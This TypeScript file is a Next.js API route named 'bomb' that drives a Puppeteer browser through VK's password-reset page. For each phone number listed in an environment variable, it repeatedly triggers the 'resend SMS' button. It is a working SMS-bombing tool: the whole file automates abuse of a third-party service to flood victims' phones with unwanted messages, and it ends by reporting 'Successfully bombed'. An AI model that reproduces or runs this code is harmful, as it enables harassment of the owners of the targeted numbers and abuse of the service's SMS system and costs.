import { NextApiRequest, NextApiResponse } from "next";
import puppeteer, { executablePath } from "puppeteer";
import wait from "./_browser/utils/wait";
import selectors from "./_browser/selectors";
import range from "./_browser/utils/range";
import fs from "node:fs";
import doesStrExistOnPage from "./_browser/utils/doesStrExistOnPage";
import clickResendSmsBtn from "./_browser/actions/clickResendSmsBtn";
import inputPhoneNumber from "./_browser/actions/inputPhoneNumber";
import pressEnter from "./_browser/actions/pressEnter";
import confirmFirstTime from "./_browser/actions/confirmFirstTime";
import confirmSecondTimeIfNeeded from "./_browser/actions/confirmSecondTimeIfNeeded";

export default async function bomb(req: NextApiRequest, res: NextApiResponse) {
  const phoneNumbersStr = process.env.PHONE_NUMBERS;
  if (!phoneNumbersStr) throw new Error("no phone numbers are provided");
  
  const phoneNumbers = phoneNumbersStr.split(" ");

  const NODE_ENV = process.env.NODE_ENV;
  const browser = await puppeteer.launch({
    headless: NODE_ENV === "production" ? true : false,
    executablePath: NODE_ENV === "production"
      ? process.env.PUPPETEER_EXECUTABLE_PATH
      : puppeteer.executablePath()
  });
  console.log("Browser launched...");
  
  const promises = phoneNumbers.map(async phoneNumber => {
    const page = await browser.newPage();
    
    await page.goto("https://id.vk.com/restore/#/resetPassword");
    
    await inputPhoneNumber(page, phoneNumber);
    await pressEnter(page);
    
    await confirmFirstTime(page);
    await confirmSecondTimeIfNeeded(page);
    
    await clickResendSmsBtn(page);

    await wait(range(5000, 6000));
  });
  await Promise.all(promises);
  await browser.close();

  res.status(200).send("Successfully bombed");
}
